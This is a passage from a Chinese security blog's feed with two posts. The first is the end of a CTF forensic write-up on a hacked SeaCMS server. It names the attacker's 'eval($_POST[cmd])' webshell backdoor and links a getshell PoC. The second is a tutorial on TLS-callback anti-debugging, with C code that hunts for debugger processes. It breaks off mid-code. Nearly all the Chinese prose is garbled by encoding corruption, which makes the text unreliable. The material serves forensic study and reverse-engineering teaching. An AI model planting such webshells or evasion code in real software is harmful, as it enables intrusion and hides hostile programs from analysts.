å‰ï¼Œç„¶åæˆ‘ä¿¡æ¯çš„æ”¶é›†ä¹Ÿä¸æ˜¯å¾ˆåˆ°ä½ï¼Œç¬¬ä¸€é¢˜æ€•åšé”™ä¼šæ‰£åˆ†ï¼Œä¸‡ä¸€æˆ‘ä»¬è¿ä¸‰ç­‰å¥–éƒ½æ‹¿ä¸åˆ°äº†ï¼Œå°±æ²¡æ•¢åšã€‚æ¯”èµ›ç»“æŸåæ‰çŸ¥é“æ¯ä¸ªé˜Ÿä¼éƒ½ä¼šè·å¥–â€¦</p><h1 id="æº¯æºè¿‡ç¨‹è®°å½•"><a href="#æº¯æºè¿‡ç¨‹è®°å½•" class="headerlink" title="æº¯æºè¿‡ç¨‹è®°å½•"></a>æº¯æºè¿‡ç¨‹è®°å½•</h1><p>é¢˜ç›®å·®ä¸å¤šæ˜¯è¿™æ ·ï¼šé»‘å®¢åœ¨å†…ç½‘ä¸­æ‹¿åˆ°äº†ä¸¤å°è‚‰é¸¡ï¼Œç„¶åé€šè¿‡è¿™ä¸¤å°è‚‰é¸¡å¯¹ä¸€å°æœåŠ¡å™¨è¿›è¡Œäº†æ”»å‡»ï¼Œæˆ‘ä»¬åˆ™éœ€è¦å¯¹è¿™å°æœåŠ¡å™¨æº¯æºå–è¯åˆ†æï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ç•™ä¸‹çš„åé—¨ã€‚</p><p>åˆšæ‹¿åˆ°æœåŠ¡å™¨ï¼Œå…ˆåœ¨åœ¨rootçš„å®¶ç›®å½•ä¸‹æŸ¥çœ‹äº†ä¸€ä¸‹éšè—æ–‡ä»¶ï¼Œæ²¡æƒ³åˆ°ä¸€ä¸‹å­å°±æœ‰æ”¶è·ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/1.png" alt="æ•°æ®åº“çš„è´¦å·å’Œå¯†ç "></p><p>åœ¨è¿™é‡Œä¸€ä¸‹å­å°±æ‹¿åˆ°äº†æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ã€‚</p><p>ç„¶åå°è¯•ç™»é™†ä¸€ä¸‹æ•°æ®åº“ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>seacms</code>çš„æ•°æ®åº“ï¼Œç„¶åè¿›å»ä¹‹åå‘ç°ä¸€äº›é‡è¦çš„ä¿¡æ¯ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/2.png" alt="adminå’Œhackerçš„è´¦å·å¯†ç å’Œip"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/3.png" alt="èƒ½åˆ¤æ–­å‡ºè¿™æ˜¯ä¸€ä¸ªæµ·æ´‹cmsçš„ç«™"></p><p>çœ‹å®Œæ•°æ®åº“ï¼Œæˆ‘å°±å»æŸ¥äº†ä¸€ä¸‹å…³äºæµ·æ´‹cmsçš„æ´ï¼š</p><ul><li><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/150042.html</a></li><li><a href="https://www.jianshu.com/p/ebf156afda49" target="_blank" rel="noopener">https://www.jianshu.com/p/ebf156afda49</a></li></ul><p>å¤§æ¦‚çŸ¥é“äº†æ˜¯åœ¨webæ ¹ç›®å½•ä¸‹çš„<code>search.php</code>ä¸­å­˜åœ¨æ¼æ´ï¼Œç„¶åé€šè¿‡åˆ†æé»‘å®¢å¯èƒ½ç”¨æ¥æ”»å‡»çš„<a href="https://github.com/SparkHex/seacms-getshell-poc" target="_blank" rel="noopener">è„šæœ¬</a>ï¼Œå¤§æ¦‚çŸ¥é“äº†æ”»å‡»è¿‡ç¨‹ã€‚</p><p>æˆ‘è¿™é‡Œè¿˜æŠŠ<code>search.php</code>è®°å½•ä¸‹æ¥äº†ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/4.png" alt="search.phpç¬¬1éƒ¨åˆ†"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/5.png" alt="search.phpç¬¬2éƒ¨åˆ†"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/6.png" alt="search.phpç¬¬3éƒ¨åˆ†"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/7.png" alt="search.phpç¬¬4éƒ¨åˆ†"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/8.png" alt="search.phpç¬¬5éƒ¨åˆ†"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/9.png" alt="search.phpç¬¬6éƒ¨åˆ†"></p><p>åœ¨webç›®å½•ä¸‹è¿˜çœ‹åˆ°äº†ä¸€ä¸ª<code>360safe</code>ï¼Œå°±æˆªäº†å¼ å›¾ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/10.png" alt="360safeç›®å½•"></p><p>ç„¶åæˆ‘çœ‹äº†ä¸€ä¸‹æ¯ä¸ªç”¨æˆ·å®¶ç›®å½•ä¸‹çš„<code>.bash_history</code>ï¼Œæ­£å¸¸çš„ç”¨æˆ·<code>simple</code>ä»¥åŠé»‘å®¢åˆ›å»ºçš„<code>hacker</code>éƒ½æ²¡å•¥ï¼Œä¸»è¦æ˜¯rootçš„<code>.bash_history</code>ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/11.png" alt="å…³é—­äº†é˜²ç«å¢™"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/12.png" alt="è£…äº†å®‰å…¨ç‹—"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/13.png" alt="å¤‡ä»½äº†ä¸€ä»½passwd"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/14.png" alt="passwdå¤‡ä»½æ–‡ä»¶"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/15.png" alt="è¢«ä¿®æ”¹è¿‡çš„passwd"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/16.png" alt="ä¸€ä¸²å¥‡æ€ªçš„Xshell"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/17.png" alt="åˆ æ‰äº†webç›®å½•ä¸‹uploadsä¸­æŸä¸ªæ–‡ä»¶å¤¹ä¸­çš„å†…å®¹"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/18.png" alt="è¿™é‡Œåº”è¯¥æ˜¯èµ·äº†æµ·æ´‹cmsçš„æœåŠ¡"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/19.png" alt="åˆ‡æ¢åˆ°hackerç”¨æˆ·ï¼Œç„¶åå¤‡ä»½äº†ä¸€ä¸ªbashæ”¹äº†è¿˜æƒé™"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/20.png" alt="ä¸€å †å¯¹logæ–‡ä»¶è¿˜æœ‰å…¶ä»–æ–‡ä»¶çš„æ“ä½œ"></p><p>å¤§æ¦‚æ”¶é›†äº†è¿™äº›ï¼Œä¹Ÿèƒ½æ¨æ–­å‡ºé»‘å®¢æ‹¿åˆ°æƒé™åæ–°å»ºäº†ä¸€ä¸ªå«hackerçš„ç”¨æˆ·ï¼Œç„¶åé»‘å®¢çš„æ“ä½œæ˜¯ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹çš„ä¹Ÿæ— æ³•åˆ¤æ–­ã€‚å†<code>grep</code>ä¸€ä¸‹ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/21.png" alt="å’Œhackerç›¸å…³çš„ä¸€äº›æ“ä½œ"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/22.png" alt="å‘ç°rootæŸ¥çœ‹è¿‡ä¸€äº›logæ–‡ä»¶"></p><p>ä¸‹ä¸€æ­¥æˆ‘å°±å¼€å§‹çœ‹æ—¥å¿—ï¼Œé€šè¿‡å¯¹<code>.bash_history</code>çš„é˜…è¯»ï¼Œåˆ¤æ–­ä¸»è¦æ˜¯åœ¨<code>/var/log/httpd</code>ä¸‹å’Œ<code>/var/www/html/logs</code>ä¸‹çš„logæ–‡ä»¶ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/23.png" alt="ä¸»è¦åœ¨access_logä¸­"></p><p>ç„¶åå°±å¼€å§‹å¯¹logæ–‡ä»¶ä¸€è¡Œä¸€è¡Œçœ‹ä¸‹æ¥ï¼š</p><p>åŸºæœ¬çœ‹åˆ°å‡ ä¸ªipï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/24.png" alt="192.168.12.173"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/25.png" alt="192.168.12.156"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/26.png" alt="192.168.31.119"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/27.png" alt="192.168.12.125"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/28.png" alt="192.168.31.73"></p><p>åœ¨åé¢ä¸€ç‚¹çš„æ—¶å€™ä¼šçœ‹åˆ°<code>192.168.12.173</code>ï¼Œé€šè¿‡GETçš„urlå¾ˆå®¹æ˜“åˆ¤æ–­å‡ºåœ¨ç”¨è„šæœ¬æ‰“ç½‘ç«™ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/29.png" alt="çœ‹åˆ°seacmsçš„pocææƒè„šæœ¬"></p><p>æœ€åçœ‹åˆ°å¯ä»¥é»‘å®¢åœ¨æ”¾åé—¨<code>eval($_POST[cmd])</code>ï¼š</p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/30.png" alt="åˆ¤æ–­æ˜¯é»‘å®¢ç”¨192.168.31.119ç™»ä¸Šäº†admin"></p><p><img src="/pics/2018-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›-æ•°æ®èµ›-writeup/31.png" alt="åé—¨"></p><p>å¤§æ¦‚çš„åˆ†æå°±æ˜¯è¿™æ ·ï¼Œä¸­é—´ä¹Ÿè¸©äº†å¾ˆå¤šå‘ã€‚æˆ‘æœ€åçš„åˆ¤æ–­æ˜¯ï¼š</p><table><thead><tr><th style="text-align:center">IP</th><th style="text-align:center">IDENTITY</th><th style="text-align:center">OPERATING SYSTEM</th></tr></thead><tbody><tr><td style="text-align:center">192.168.31.119</td><td style="text-align:center">admin</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.129</td><td style="text-align:center">victim</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.173</td><td style="text-align:center">bot</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.156</td><td style="text-align:center">bot</td><td style="text-align:center">windows</td></tr><tr><td style="text-align:center">192.168.12.125</td><td style="text-align:center">bot</td><td style="text-align:center">android</td></tr><tr><td style="text-align:center">192.168.31.73</td><td style="text-align:center">bot</td><td style="text-align:center">android</td></tr></tbody></table><p>æ„Ÿè§‰è‡ªå·±æ•´ä½“åˆ†æä¸‹æ¥åº”è¯¥æ–¹å‘æ˜¯æ²¡é”™çš„ï¼Œå¯èƒ½å› ä¸ºè‡ªå·±æ²¡å­¦è¿‡è®¡ç½‘ï¼Œå¯¹ä¸€äº›ç½‘ç»œçš„åè®®å’Œè¯·æ±‚æ–¹å¼æ²¡æœ‰äº†è§£å¾ˆé€å½»ï¼Œå¯¼è‡´æ¯”èµ›çš„æ—¶å€™ç¬¬ä¸€é¢˜é—®ä¸¤å°è‚‰é¸¡çš„ipå°±åˆ¤æ–­é”™äº†ï¼Œç„¶åå°±æ²¡æ•¢åšä¸‹å»â€¦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç¬¬ä¸€æ¬¡å‚åŠ é“ä¸‰ï¼Œè¿™æ¬¡æ€»å†³èµ›ä¸­çš„æ•°æ®èµ›ä¸å†æ˜¯ä¹‹å‰çš„çœ‹æ•°æ®åŒ…ï¼Œè€Œæ˜¯ç›´æ¥ç»™äº†ä¸€å°webæœåŠ¡å™¨æº¯æºã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤</title>
    <link href="https://qianfei11.github.io/2018/12/08/%E7%BB%95%E8%BF%87TLS%EF%BC%88Thread%20Local%20Storage%EF%BC%89%E5%92%8CSMC%EF%BC%88Self%20Modifying%20Code%EF%BC%89%E4%BF%9D%E6%8A%A4/"/>
    <id>https://qianfei11.github.io/2018/12/08/ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤/</id>
    <published>2018-12-08T04:37:41.000Z</published>
    <updated>2019-02-03T10:26:10.704Z</updated>
    
    <content type="html"><![CDATA[<p>mainå‡½æ•°å‰æœ‰ä»€ä¹ˆï¼Ÿ</p><a id="more"></a><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><h2 id="ä»€ä¹ˆæ˜¯TLS"><a href="#ä»€ä¹ˆæ˜¯TLS" class="headerlink" title="ä»€ä¹ˆæ˜¯TLS"></a>ä»€ä¹ˆæ˜¯TLS</h2><p>TLSï¼ˆThread Local Storageï¼‰å›è°ƒå‡½æ•°æ˜¯æ¯å½“åˆ›å»º/ç»ˆæ­¢è¿›ç¨‹çš„çº¿ç¨‹æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨æ‰§è¡Œçš„å‡½æ•°ã€‚åˆ›å»ºçš„ä¸»çº¿ç¨‹ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œä¸”å…¶è°ƒç”¨æ‰§è¡Œå…ˆäºEPï¼ˆEntry Pointï¼‰ä»£ç ã€‚åŠŸèƒ½å°±æ˜¯æŠŠPEæ–‡ä»¶çš„TEXTæ®µè¿›è¡ŒåŠ å¯†ï¼Œéšè—ä»–çš„é™æ€ä»£ç æ®µç‰¹æ€§ï¼Œåœ¨è¿è¡Œçš„æ—¶å€™æŠ¢åœ¨mainå‡½æ•°æ‰§è¡Œä¹‹å‰æŠŠä»£ç æ®µç›´æ¥åœ¨å†…å­˜é‡Œé¢è§£å¯†ï¼ˆä¸ç„¶å°±å´©æºƒäº†ï¼‰ï¼Œä»è€Œè¾¾åˆ°é™æ€ä»£ç éšè—åŠŸèƒ½ã€‚</p><h2 id="ç¼–å†™TLS"><a href="#ç¼–å†™TLS" class="headerlink" title="ç¼–å†™TLS"></a>ç¼–å†™TLS</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="comment">//ä½¿ç”¨tls å›è°ƒå‡½æ•°</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨TLS çš„å®</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/INCLUDE:__tls_used"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lookupprocess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line">pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>); <span class="comment">// åœ¨å¿«ç…§ä¸­åŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹</span></span><br><span class="line">BOOL bMore = Process32First(hProcessSnap, &amp;pe32); <span class="comment">// è·å¾—ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„å¥æŸ„</span></span><br><span class="line"><span class="keyword">while</span> (bMore) &#123;</span><br><span class="line">_wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollyice.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////WARNING///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollydbg.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"peid.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ida.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"idaq.exe"</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">bMore = Process32Next(hProcessSnap, &amp;pe32); <span class="comment">// è·å–ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„å¥æŸ„</span></span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hProcessSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Debugger</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax, dword ptr fs:[<span class="number">30</span>h]<span class="comment">//TEBåç§»30Hå¤„</span></span><br><span class="line">movzx eax, byte ptr ds:[eax + <span class="number">2</span>h]<span class="comment">//å–PEBä¸­BeingDebugï¼Œè‹¥ä¸º1åˆ™è¢«è°ƒè¯•</span></span><br><span class="line">mov result, eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">tls_callback</span><span class="params">(PVOID h, DWORD reason, PVOID pv)</span> </span>&#123;</span><br><span class="line">lookupprocess();</span><br><span class="line">Debugger();</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Not_Main_this_is_tls!"</span>, <span class="string">L"tls"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">".CRT$XLB"</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Main!"</span>, <span class="string">L"ESE"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è°ƒè¯•TLS"><a href="#è°ƒè¯•TLS" class="headerlink" title="è°ƒè¯•TLS"></a>è°ƒè¯•TLS</h2><p>æŠŠæœ‰TLSä¿æŠ¤çš„ç¨‹åºæ‹–è¿›idaåˆ†æï¼Œä¼šçœ‹åˆ°mainå‡½æ•°å…¶å®æ˜¯ç©ºçš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨startï¼ˆä¹Ÿå°±æ˜¯entry pointï¼‰å¤„ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š</p><p><img src="/pics/ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤/1.png" alt="è®¾ä¸‹æ–­ç‚¹"></p><p>å‘ç°ç¨‹åºä¾ç„¶æ‰§è¡Œäº†ï¼Œè¯´æ˜ç¨‹åºåœ¨entry pointä¹‹å‰è¿è¡Œäº†ã€‚</p><p><img src="/pics/ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤/2.png" alt="ç¨‹åºè¿è¡Œ"></p><p>åŒæ—¶å¯ä»¥æŸ¥çœ‹entry point listï¼ˆCtrl+Eï¼‰ï¼Œå‘ç°idaä¹Ÿå·²ç»åç¼–è¯‘å‡ºäº†ä¸€ä¸ªå«åš<code>TlsCallback_0()</code>çš„å‡½æ•°ï¼š</p><p><img src="/pics/ç»•è¿‡TLSï¼ˆThread Local Storageï¼‰å’ŒSMCï¼ˆSelf Modifying Codeï¼‰ä¿æŠ¤/3.png" alt="entry point list"></p><p>æŸ¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°çš„åæ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">stdcall <span class="title">TlsCallback_0</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, Text, Caption, <span class="number">0</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯è®¸å¤šæœªçŸ¥ç¨‹åºåœ¨é€†å‘æ—¶ï¼Œæ›´å»ºè®®åœ¨è™šæ‹Ÿç¯å¢ƒä¸‹è¿è¡Œçš„åŸå› ã€‚</p><h2 id="æ‰‹åŠ¨å»é™¤TLS"><a href="#æ‰‹åŠ¨å»é™¤TLS" class="headerlink" title="æ‰‹åŠ¨å»é™¤TLS"></a>æ‰‹åŠ¨å»é™¤TLS</h2><p>TlsCallbackå‡½æ•°çš„å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> VOID</span><br><span class="line">(NTAPI *PIMAGE_TLS_CALLBACK) (</span><br><span class="line">    PVOID DllHandle,     <span class="comment">// æ¨¡å—å¥æŸ„ï¼Œå³åŠ è½½åœ°å€</span></span><br><span class="line">    DWORD Reason,        </span><br><span class="line">    PVOID Reserved</span><br><span class="line">    );</span><br><span class="line">å…¶ä¸­reasonæœ‰ä»¥ä¸‹å‡ ç§ï¼š(winNT.h)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_ATTACH   1  <span class="comment">// è¿›ç¨‹å¯åŠ¨</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_ATTACH    2  <span class="comment">// çº¿ç¨‹å¯åŠ¨</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_DETACH    3  <span class="comment">// 